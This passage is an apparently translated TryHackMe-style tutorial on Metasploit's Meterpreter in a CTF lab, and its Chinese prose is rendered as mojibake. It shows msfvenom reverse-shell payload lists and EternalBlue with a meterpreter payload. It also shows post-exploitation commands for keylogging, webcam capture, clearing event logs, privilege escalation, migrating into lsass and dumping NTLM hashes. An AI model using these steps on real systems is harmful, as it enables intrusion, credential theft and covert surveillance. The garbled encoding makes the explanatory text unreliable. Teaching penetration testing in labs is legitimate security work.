DEVRTL.dll, SPINF.dll, CRYPTSP.dll, rsaenh.dll, WINSTA.dll, cscapi.dll, netutils.dll, WININET.dll, urlmon.dll, iertutil.dll, WINHTTP.dll, webio.dll, SHELL32.dll, MPR.dll, NETAPI32.dll, wkscli.dll, PSAPI.DLL, WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL, apphelp.dll, NLAapi.dll, napinsp.dll, pnrpnsp.dll, winrnr.dll C:\\Windows\\system32&gt; å¯ç”¨äºæ£€æµ‹ Meterpreter çš„æŠ€æœ¯å’Œå·¥å…·è¶…å‡ºäº†æœ¬æ–‡æ¶‰åŠçš„çŸ¥è¯†ç‚¹èŒƒå›´ã€‚ æœ¬æ–‡æ—¨åœ¨å‘ä½ å±•ç¤º Meterpreter çš„éšè”½è¿è¡Œæ–¹å¼ï¼Œä½†æ˜¯è¯·è®°ä½ï¼Œå¤§å¤šæ•°é˜²ç—…æ¯’è½¯ä»¶éƒ½ä¼šæ£€æµ‹åˆ°å®ƒï¼›å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒMeterpreter ä¼šä¸æ”»å‡»è€…çš„ç³»ç»Ÿå»ºç«‹åŠ å¯†ï¼ˆTLSï¼‰é€šä¿¡é€šé“ã€‚ 0x02 Meterpreterçš„ç‰¹æ€§ æ­£å¦‚åœ¨ä¹‹å‰çš„ Metasploit çŸ¥è¯†ç‚¹æ–‡ç« ä¸­æ‰€è®¨è®ºçš„ï¼ŒMetasploit æœ‰æ•ˆè½½è·æœ€åˆå¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼š å†…è”ï¼ˆä¹Ÿç§°ä¸ºå•ï¼‰payload å’Œåˆ†é˜¶æ®µpayloadã€‚ åˆ†é˜¶æ®µçš„payloadåˆ†ä¸¤æ­¥å‘é€åˆ°ç›®æ ‡æœºå™¨ï¼Œå…ˆè£…è½½åˆå§‹éƒ¨åˆ†ï¼ˆstagerï¼‰çš„payloadï¼Œå†è¯·æ±‚åŠ è½½å…¶ä½™éƒ¨åˆ†çš„payloadï¼Œè¿™å…è®¸å­˜åœ¨è¾ƒå°çš„åˆå§‹payloadç‰‡æ®µï¼›è€Œå†…è”payloadåˆ™æ˜¯ä¸€æ¬¡æ€§å…¨éƒ¨å‘é€ã€‚Meterpreter æœ‰æ•ˆè½½è·ä¹Ÿåˆ†ä¸ºåˆ†æ®µå’Œå†…è”ç‰ˆæœ¬ï¼Œä½†æ˜¯ï¼ŒMeterpreteræœ¬èº«æœ‰å¤šç§ä¸åŒçš„ç‰ˆæœ¬ï¼Œä½ å¯ä»¥æ ¹æ®ä½ çš„ç›®æ ‡ç³»ç»Ÿè¿›è¡Œé€‰æ‹©ã€‚ äº†è§£å¯ç”¨çš„ Meterpreter ç‰ˆæœ¬çš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ msfvenom åˆ—å‡ºå®ƒä»¬ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ ä½¿ç”¨\" msfvenom --list payloads \" å‘½ä»¤å†åŠ ä¸Š\" | grep meterpreter \" ç­›é€‰å‡ºmeterpreter ç±»å‹çš„payloadã€‚ root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter android/meterpreter/reverse_http Run a meterpreter server in Android. Tunnel communication over HTTP android/meterpreter/reverse_https Run a meterpreter server in Android. Tunnel communication over HTTPS android/meterpreter/reverse_tcp Run a meterpreter server in Android. Connect back stager android/meterpreter_reverse_http Connect back to attacker and spawn a Meterpreter shell android/meterpreter_reverse_https Connect back to attacker and spawn a Meterpreter shell android/meterpreter_reverse_tcp Connect back to the attacker and spawn a Meterpreter shell apple_ios/aarch64/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) apple_ios/aarch64/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) apple_ios/aarch64/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) apple_ios/armle/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) apple_ios/armle/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) apple_ios/armle/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) java/meterpreter/bind_tcp Run a meterpreter server in Java. Listen for a connection java/meterpreter/reverse_http Run a meterpreter server in Java. Tunnel communication over HTTP java/meterpreter/reverse_https Run a meterpreter server in Java. Tunnel communication over HTTPS java/meterpreter/reverse_tcp Run a meterpreter server in Java. Connect back stager linux/aarch64/meterpreter/reverse_tcp Inject the mettle server payload (staged). Connect back to the attacker linux/aarch64/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) linux/aarch64/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) linux/aarch64/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) linux/armbe/meterpreter_reverse_http Run the Meterpreter / Mettle server payload (stageless) linux/armbe/meterpreter_reverse_https Run the Meterpreter / Mettle server payload (stageless) linux/armbe/meterpreter_reverse_tcp Run the Meterpreter / Mettle server payload (stageless) linux/armle/meterpreter/bind_tcp Inject the mettle server payload (staged). Listen for a connection linux/armle/meterpreter/reverse_tcp Inject the mettle server payload (staged). Connect back to the attacker [...] è¯¥åˆ—è¡¨å°†æ˜¾ç¤ºé€‚ç”¨äºä»¥ä¸‹å¹³å°çš„ Meterpreter ç‰ˆæœ¬ï¼š Android Apple iOS Java Linux OSX PHP Python Windows ä½ å†³å®šä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„ Meterpreter å°†ä¸»è¦åŸºäºä¸‰ä¸ªå› ç´ ï¼š ç›®æ ‡æ“ä½œç³»ç»Ÿï¼ˆç›®æ ‡æ“ä½œç³»ç»Ÿæ˜¯ Linux è¿˜æ˜¯ Windowsï¼Ÿæ˜¯ Mac è®¾å¤‡ï¼Ÿæ˜¯ Android æ‰‹æœºï¼Ÿç­‰ç­‰ï¼‰ ç›®æ ‡ç³»ç»Ÿä¸Šå¯ç”¨çš„ç»„ä»¶ï¼ˆæ˜¯å¦å®‰è£…äº† Pythonï¼Ÿè¿™æ˜¯ä¸€ä¸ª PHP ç½‘ç«™å—ï¼Ÿç­‰ç­‰ï¼‰ ä½ å¯ä»¥ä¸ç›®æ ‡ç³»ç»Ÿå»ºç«‹çš„ç½‘ç»œè¿æ¥ç±»å‹ï¼ˆå®ƒä»¬å…è®¸åŸå§‹ TCP è¿æ¥å—ï¼Ÿä½ åªèƒ½æœ‰ä¸€ä¸ª HTTPS åå‘è¿æ¥å—ï¼ŸIPv6 åœ°å€ä¸åƒ IPv4 åœ°å€é‚£æ ·å—åˆ°å¯†åˆ‡ç›‘æ§å—ï¼Ÿç­‰ç­‰ï¼‰ å¦‚æœä½ ä¸ä½¿ç”¨ Meterpreter ä½œä¸ºç”± Msfvenom ç”Ÿæˆçš„ç‹¬ç«‹æœ‰æ•ˆè½½è·ï¼Œä½ çš„payloadé€‰æ‹©ä¹Ÿå¯èƒ½ä¼šå—åˆ°æ¼æ´expçš„é™åˆ¶ã€‚ ä½ ä¼šæ³¨æ„åˆ°ä¸€äº›æ¼æ´expå…·æœ‰é»˜è®¤çš„ Meterpreter æœ‰æ•ˆè½½è·ï¼Œå¦‚ä¸‹é¢ç¤ºä¾‹ä¸­çš„ ms17_010_eternalblue æ¼æ´expæ‰€ç¤ºï¼Œå®ƒçš„é»˜è®¤payloadå°±æ˜¯meterpreterç±»å‹ã€‚ msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue [*] Using configured payload windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; ä½ å¯ä»¥åœ¨ä»»æ„æ¨¡å—ä¸­ä½¿ç”¨ show payloads å‘½ä»¤ï¼Œåˆ—å‡ºå…¶ä»–å¯ç”¨çš„æœ‰æ•ˆè½½è·ã€‚ msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 generic/custom manual No Custom Payload 1 generic/shell_bind_tcp manual No Generic Command Shell, Bind TCP Inline 2 generic/shell_reverse_tcp manual No Generic Command Shell, Reverse TCP Inline 3 windows/x64/exec manual No Windows x64 Execute Command 4 windows/x64/loadlibrary manual No Windows x64 LoadLibrary Path 5 windows/x64/messagebox manual No Windows MessageBox x64 6 windows/x64/meterpreter/bind_ipv6_tcp manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager 7 windows/x64/meterpreter/bind_ipv6_tcp_uuid manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support 8 windows/x64/meterpreter/bind_named_pipe manual No Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...] 0x03 Meterpreter å‘½ä»¤ åœ¨ä»»ä½•å·²ç»æˆåŠŸå»ºç«‹çš„Meterpreter ä¼šè¯ä¸­ï¼ˆå‘½ä»¤æç¤ºç¬¦ç•Œé¢ä¸º Meterpreter &gt; ï¼‰è¾“å…¥helpï¼Œå°†åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„å‘½ä»¤ï¼ˆä¸‹å›¾åªæ˜¾ç¤ºå‡ºä¸€éƒ¨åˆ†å‘½ä»¤ï¼‰ã€‚ meterpreter &gt; help Core Commands ============= Command Description ------- ----------- ? Help menu background Backgrounds the current session bg Alias for background bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel[...] æ¯ä¸ªç‰ˆæœ¬çš„ Meterpreter éƒ½ä¼šæœ‰ä¸åŒçš„å‘½ä»¤é€‰é¡¹ï¼Œå› æ­¤è¿è¡Œhelp å‘½ä»¤æ€»æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚å‘½ä»¤æ˜¯ Meterpreter ä¸Šå¯ç”¨çš„å†…ç½®å·¥å…·ã€‚å®ƒä»¬å°†åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œï¼Œè€Œæ— éœ€åŠ è½½ä»»ä½•å…¶ä»–è„šæœ¬æˆ–å¯æ‰§è¡Œæ–‡ä»¶ã€‚ Meterpreter å°†ä¸ºæ‚¨æä¾›ä¸‰ä¸ªä¸»è¦ç±»åˆ«çš„å·¥å…·ï¼› Built-in commands å†…ç½®å‘½ä»¤ Meterpreter tools Meterpreterå·¥å…· Meterpreter scripting Meterpreter è„šæœ¬ å½“ä½ è¾“å…¥\" help \"å‘½ä»¤æ¥æŸ¥çœ‹å‘½ä»¤åˆ—è¡¨æ—¶ï¼Œä½ å°†çœ‹åˆ° Meterpreterä¸­çš„å‘½ä»¤ è¢«åˆ—ä¸¾åœ¨ä¸åŒçš„ç±»åˆ«ä¸‹ï¼š Core commands æ ¸å¿ƒå‘½ä»¤ File system commands æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤ Networking commands è”ç½‘å‘½ä»¤ System commands ç³»ç»Ÿå‘½ä»¤ User interface commands ç”¨æˆ·ç•Œé¢å‘½ä»¤ Webcam commands ç½‘ç»œæ‘„åƒå¤´å‘½ä»¤ Audio output commands éŸ³é¢‘è¾“å‡ºå‘½ä»¤ Elevate commands æå‡å‘½ä»¤ Password database commands å¯†ç æ•°æ®åº“å‘½ä»¤ Timestomp commands æ—¶é—´æˆ³å‘½ä»¤ è¯·æ³¨æ„ï¼Œä¸Šé¢çš„åˆ—è¡¨å–è‡ª Windows ç‰ˆæœ¬çš„ Meterpreter (windows/x64/meterpreter/reverse_tcp) ä¸Šçš„\" help \" å‘½ä»¤çš„è¾“å‡ºç»“æœï¼Œå¯¹äºå…¶ä»– Meterpreter ç‰ˆæœ¬ï¼Œè¿™äº›å‘½ä»¤åˆ—è¡¨å°†æœ‰æ‰€ä¸åŒã€‚ Meterpreter å‘½ä»¤è¯¦è§£ æ ¸å¿ƒå‘½ä»¤å°†æœ‰åŠ©äºåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯¼èˆª å¹¶èƒ½ä¸ç›®æ ‡ç³»ç»Ÿå‘ç”Ÿäº¤äº’ã€‚ä¸‹é¢æ˜¯ä¸€äº›æœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œåœ¨æˆåŠŸå»ºç«‹meterpreterä¼šè¯ä¹‹åï¼Œè®°å¾—è¿è¡Œ\" help \"å‘½ä»¤æ¥æ£€æŸ¥å½“å‰çš„meterpreterä¸­çš„æ‰€æœ‰å¯ç”¨å‘½ä»¤ã€‚ Core commands æ ¸å¿ƒå‘½ä»¤ background: èƒŒæ™¯åŒ–å½“å‰ä¼šè¯ exit: ç»ˆæ­¢ Meterpreter ä¼šè¯ guid: è·å–ä¼šè¯ GUID (å…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦) help: æ˜¾ç¤ºå¸®åŠ©èœå• info:æ˜¾ç¤ºæœ‰å…³Postæ¨¡å—çš„ä¿¡æ¯ irb: åœ¨å½“å‰ä¼šè¯ä¸Šæ‰“å¼€äº¤äº’å¼ Ruby shell load: åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ª Meterpreter æ‰©å±• migrate: å…è®¸ä½ å°† Meterpreter è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ run:æ‰§è¡Œ Meterpreter è„šæœ¬æˆ– Post æ¨¡å— sessions: å¿«é€Ÿåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¼šè¯ File system commands æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤ cd: å°†æ›´æ”¹ç›®å½• ls: å°†åœ¨å·¥ä½œç›®å½•ä¸­åˆ—å‡ºæ–‡ä»¶(dir ä¹Ÿå¯ä»¥) pwd: æ‰“å°å½“å‰çš„å·¥ä½œç›®å½• edit: å°†å…è®¸ä½ ç¼–è¾‘æ–‡ä»¶ cat:å°†å‘å±å¹•æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ rm: å°†åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶ search: å°†æœç´¢æ–‡ä»¶ upload: å°†ä¸Šä¼ æ–‡ä»¶æˆ–ç›®å½• download: å°†ä¸‹è½½æ–‡ä»¶æˆ–ç›®å½• Networking commands è”ç½‘å‘½ä»¤ arp: æ˜¾ç¤ºä¸»æœº ARP (åœ°å€è§£æåè®®â€“Address Resolution Protocol)ç¼“å­˜ ifconfig: æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿä¸Šå¯ç”¨çš„ç½‘ç»œæ¥å£ netstat: æ˜¾ç¤ºç½‘ç»œè¿æ¥ portfwd: å°†æœ¬åœ°ç«¯å£è½¬å‘åˆ°è¿œç¨‹æœåŠ¡ route:å…è®¸ä½ æŸ¥çœ‹å’Œä¿®æ”¹è·¯ç”±è¡¨ System commands ç³»ç»Ÿå‘½ä»¤ clearev: æ¸…é™¤äº‹ä»¶ï¼ˆevent ï¼‰æ—¥å¿— execute: æ‰§è¡Œï¼ˆexecuteï¼‰å‘½ä»¤ getpid: æ˜¾ç¤ºå½“å‰çš„è¿›ç¨‹ID getuid: æ˜¾ç¤ºæ­£åœ¨è¿è¡Œ Meterpreter çš„ç”¨æˆ·èº«ä»½ kill: ç»ˆæ­¢è¿›ç¨‹ pkill:æŒ‰åç§°ç»ˆæ­¢è¿›ç¨‹ ps: åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ reboot: é‡å¯è¿œç¨‹è®¡ç®—æœº shell: è¿›å…¥ç³»ç»Ÿå‘½ä»¤shell shutdown: å…³é—­è¿œç¨‹è®¡ç®—æœº sysinfo:è·å–è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ“ä½œç³»ç»Ÿ Others Commands å…¶ä»–å‘½ä»¤(è¿™äº›å‘½ä»¤å°†åˆ—åœ¨å¸®åŠ©èœå•çš„ä¸åŒèœå•ç±»åˆ«ä¸‹) idletime: è¿”å›è¿œç¨‹ç”¨æˆ·ç©ºé—²çš„ç§’æ•° keyscan_dump: è½¬å‚¨æŒ‰é”®ç¼“å†²åŒº keyscan_start: å¼€å§‹æ•æ‰æŒ‰é”® keyscan_stop: åœæ­¢æ•æ‰æŒ‰é”® screenshare: å…è®¸ä½ å®æ—¶ç›‘è§†è¿œç¨‹ç”¨æˆ·çš„æ¡Œé¢ screenshot: æŠ“å–äº¤äº’å¼æ¡Œé¢çš„å±å¹•å¿«ç…§ record_mic: ä»é»˜è®¤éº¦å…‹é£è®°å½• X ç§’çš„éŸ³é¢‘ webcam_chat: å¼€å§‹è§†é¢‘èŠå¤© webcam_list: åˆ—å‡ºç½‘ç»œæ‘„åƒå¤´ webcam_snap: ä»æŒ‡å®šçš„æ‘„åƒå¤´æ‹æ‘„å¿«ç…§ webcam_stream:æ’­æ”¾æŒ‡å®šæ‘„åƒå¤´çš„è§†é¢‘æµ getsystem:è¯•å›¾å°†ä½ çš„æƒé™æå‡åˆ°æœ¬åœ°ç³»ç»Ÿçš„æƒé™ hashdump: è½¬å‚¨ SAM æ•°æ®åº“çš„å†…å®¹ å°½ç®¡æ‰€æœ‰è¿™äº›å‘½ä»¤åœ¨å¸®åŠ©èœå•ä¸‹ä¼¼ä¹éƒ½å¯ç”¨ï¼Œä½†å®ƒä»¬å¯èƒ½å¹¶ä¸éƒ½æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼Œç›®æ ‡ç³»ç»Ÿå¯èƒ½æ²¡æœ‰ç½‘ç»œæ‘„åƒå¤´ï¼Œæˆ–è€…ç›®æ ‡ç³»ç»Ÿå¯ä»¥åœ¨æ²¡æœ‰é€‚å½“æ¡Œé¢ç¯å¢ƒçš„è™šæ‹Ÿæœºä¸Šè¿è¡Œã€‚ 0x04 Meterpreter è¿›è¡Œåæ¸—é€ Meterpreter ä¸ºä½ æä¾›äº†è®¸å¤šæœ‰ç”¨çš„å‘½ä»¤ï¼Œå¯ä»¥å¸®åŠ©ä½ å®ŒæˆåæœŸåˆ©ç”¨ï¼ˆåæ¸—é€ï¼‰é˜¶æ®µï¼Œä¸‹é¢æ˜¯ä¸€äº›ä½ ç»å¸¸ä½¿ç”¨çš„ä¾‹å­ã€‚ Help æ­¤å‘½ä»¤å°†ä¸ºä½ æä¾› Meterpreter ä¸­æ‰€æœ‰å¯ç”¨å‘½ä»¤çš„åˆ—è¡¨ã€‚æ­£å¦‚æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„ï¼ŒMeterpreter æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬å¯èƒ½æœ‰ä¸åŒçš„å¯ç”¨é€‰é¡¹ã€‚ä¸€æ—¦ä½ æˆåŠŸå»ºç«‹äº†ä¸€ä¸ª Meterpreter ä¼šè¯ï¼Œè¾“å…¥helpå‘½ä»¤ å°†å¸®åŠ©ä½ å¿«é€Ÿæµè§ˆå¯ç”¨çš„Meterpreter å‘½ä»¤ã€‚ meterpreter &gt; help Core Commands ============= Command Description ------- ----------- ? Help menu background Backgrounds the current session bg Alias for background bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel[...] Meterpreterå‘½ä»¤ getuid å‘½ä»¤å°†æ˜¾ç¤ºå½“å‰è¿è¡Œ Meterpreter çš„ç”¨æˆ·ã€‚è¿™å°†ä½¿æ‚¨äº†è§£ç›®æ ‡ç³»ç»Ÿä¸Šå¯èƒ½çš„æƒé™çº§åˆ«ï¼ˆä¾‹å¦‚ï¼Œæ‚¨æ˜¯åƒ NT AUTHORITY\\SYSTEM è¿™æ ·çš„ç®¡ç†å‘˜çº§åˆ«ç”¨æˆ·è¿˜æ˜¯æ™®é€šç”¨æˆ·ï¼Ÿï¼‰ meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter &gt; ps å‘½ä»¤å°†åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚ PID åˆ—è¿˜å°†ä¸ºæ‚¨æä¾›å°† Meterpreter è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹æ‰€éœ€çš„ PID ä¿¡æ¯ã€‚ meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 396 644 LogonUI.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\LogonUI.exe 416 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 428 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 548 540 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 596 540 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\wininit.exe 604 588 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\csrss.exe 644 588 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\winlogon.exe 692 596 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\services.exe 700 692 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 716 596 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsass.exe 724 596 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\lsm.exe 764 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 828 692 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 864 828 WmiPrvSE.exe 900 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 952 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1076 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1164 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe 1168 692 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1244 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe 1276 1304 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\cmd.exe 1304 692 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1340 692 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1388 548 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\system32\\conhost.exe[...] Migrate è¿ç§» è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹å°†æœ‰åŠ©äº Meterpreter ä¸ä¹‹äº¤äº’ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ çœ‹åˆ°ç›®æ ‡ä¸Šè¿è¡Œçš„æ–‡å­—å¤„ç†å™¨ï¼ˆä¾‹å¦‚ word.exeã€notepad.exe ç­‰ï¼‰ï¼Œä½ å¯ä»¥è¿ç§»åˆ°å®ƒå¹¶å¼€å§‹æ•è·ç”¨æˆ·å‘é€åˆ°æ­¤è¿›ç¨‹çš„æŒ‰é”®è®°å½•ã€‚æŸäº› Meterpreter ç‰ˆæœ¬å°†ä¸ºä½ æä¾› keyscan_startã€keyscan_stop å’Œ keyscan_dump å‘½ä»¤é€‰é¡¹ï¼Œä»¥ä½¿ Meterpreter èƒ½å¤Ÿåƒé”®ç›˜è®°å½•å™¨ä¸€æ ·å·¥ä½œã€‚è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ä¹Ÿå¯ä»¥å¸®åŠ©ä½ æ‹¥æœ‰æ›´ç¨³å®šçš„ Meterpreter ä¼šè¯ã€‚ è¦è¿ç§»åˆ°å…¶ä»–ä»»ä½•è¿›ç¨‹ï¼Œä½ éœ€è¦è¾“å…¥ migrate å‘½ä»¤ï¼Œåè·Ÿæ‰€éœ€ç›®æ ‡è¿›ç¨‹çš„ PIDã€‚ ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤º Meterpreterä¼šè¯ç”±å½“å‰è¿›ç¨‹ è¿ç§»åˆ°è¿›ç¨‹PID 716ã€‚ meterpreter &gt; migrate 716 [*] Migrating from 1304 to 716... [*] Migration completed successfully. meterpreter &gt; æ³¨æ„ï¼šå¦‚æœä½ ä»è¾ƒé«˜æƒé™ï¼ˆä¾‹å¦‚ SYSTEMï¼‰ç”¨æˆ·è¿ç§»åˆ°ç”±è¾ƒä½æƒé™ç”¨æˆ·ï¼ˆä¾‹å¦‚ Web æœåŠ¡å™¨ï¼‰å¯åŠ¨çš„è¿›ç¨‹ï¼Œä½ å¯èƒ½ä¼šå¤±å»ä½ çš„ç”¨æˆ·æƒé™è€Œä¸”ä½ å¯èƒ½æ— æ³•å°†å®ƒä»¬å–å›ã€‚ Hashdump å“ˆå¸Œè½¬å‚¨ hashdump å‘½ä»¤å°†åˆ—å‡º SAM æ•°æ®åº“çš„å†…å®¹ã€‚SAMï¼ˆå®‰å…¨å¸æˆ·ç®¡ç†å™¨â€“Security Account Managerï¼‰æ•°æ®åº“åœ¨ Windows ç³»ç»Ÿä¸Šçš„ä½œç”¨æ˜¯å­˜å‚¨ç”¨æˆ·çš„å¯†ç ï¼Œè¿™äº›å¯†ç ä»¥ NTLMï¼ˆæ–°æŠ€æœ¯ LAN ç®¡ç†å™¨â€“New Technology LAN Managerï¼‰æ ¼å¼å­˜å‚¨ã€‚ meterpreter &gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: meterpreter &gt; è™½ç„¶åœ¨æ•°å­¦ä¸Šä¸å¯èƒ½â€œç ´è§£â€è¿™äº›å“ˆå¸Œå€¼ï¼Œä½†æ˜¯ä½ ä»ç„¶å¯ä»¥ä½¿ç”¨åœ¨çº¿ NTLM æ•°æ®åº“æˆ–å½©è™¹è¡¨æ”»å‡»æ¥è·å–æ˜æ–‡å¯†ç ã€‚è¿™äº›å“ˆå¸Œå€¼ä¹Ÿå¯ç”¨äº Pass-the-Hash ï¼ˆå“ˆå¸Œä¼ é€’ï¼‰æ”»å‡»ï¼Œä»¥éªŒè¯è¿™äº›ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®åŒä¸€ç½‘ç»œçš„å…¶ä»–ç³»ç»Ÿã€‚ Search searchå‘½ä»¤å¯¹äºå®šä½å…·æœ‰æ½œåœ¨ä»·å€¼ä¿¡æ¯çš„æ–‡ä»¶å¾ˆæœ‰ç”¨ã€‚åœ¨ CTF çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå‘½ä»¤å¯ç”¨äºå¿«é€Ÿæ‰¾åˆ°flagæˆ–è¯æ˜æ–‡ä»¶ï¼Œè€Œåœ¨å®é™…çš„æ¸—é€æµ‹è¯•æ´»åŠ¨ä¸­ï¼Œä½ å¯èƒ½éœ€è¦æœç´¢ç”¨æˆ·ç”Ÿæˆçš„æ–‡ä»¶æˆ–ä¸€äº›å¯èƒ½åŒ…å«å¯†ç ã€å¸æˆ·ä¿¡æ¯çš„é…ç½®æ–‡ä»¶ã€‚ meterpreter &gt; search -f flag2.txt Found 1 result... c:\\Windows\\System32\\config\\flag2.txt (34 bytes) meterpreter &gt; Shell shell å‘½ä»¤å°†åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šå¯åŠ¨ä¸€ä¸ªå¸¸è§„å‘½ä»¤è¡Œ shellï¼ŒæŒ‰ä¸‹ CTRL+Z å°†å¸®åŠ©ä½ è¿”å›è‡³ Meterpreter shellã€‚ meterpreter &gt; shell Process 2124 created. Channel 1 created. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; 0x05 åæ¸—é€æŒ‘æˆ˜ Meterpreter æä¾›äº†å‡ ä¸ªé‡è¦çš„åæ¸—é€å·¥å…·ã€‚ å‰é¢æåˆ°çš„å‘½ä»¤ï¼Œä¾‹å¦‚ \" getsystem \" å’Œ\" hashdump \" å°†ä¸ºæƒé™æå‡å’Œæ¨ªå‘ç§»åŠ¨æä¾›é‡è¦çš„æ æ†å’Œä¿¡æ¯ã€‚åŸºäºMeterpreterï¼Œä½ å¯ä»¥ä½¿ç”¨å®ƒæ¥è¿è¡Œ Metasploit æ¡†æ¶ä¸Šä¸€äº›å¯ç”¨çš„åæ¸—é€æ¨¡å—ã€‚æœ€åï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨\" load \"å‘½ä»¤æ¥åˆ©ç”¨å…¶ä»–å·¥å…·ï¼Œä¾‹å¦‚ åŠ è½½Kiwiæˆ–è€…åŠ è½½æ•´ä¸ªPythonè¯­è¨€ã€‚ meterpreter &gt; load python Loading extension python...Success. meterpreter &gt; python_execute \"print 'TryHackMe Rocks!'\" [+] Content written to stdout: TryHackMe Rocks! meterpreter &gt; Meterpreter å…·æœ‰ä¸€äº›åŠŸèƒ½ï¼Œèƒ½å¤Ÿå¸®åŠ©å®Œæˆåæ¸—é€é˜¶æ®µçš„å¤šä¸ªç›®æ ‡ã€‚ æ”¶é›†æœ‰å…³ç›®æ ‡ç³»ç»Ÿçš„æ›´å¤šä¿¡æ¯ã€‚ åœ¨ç›®æ 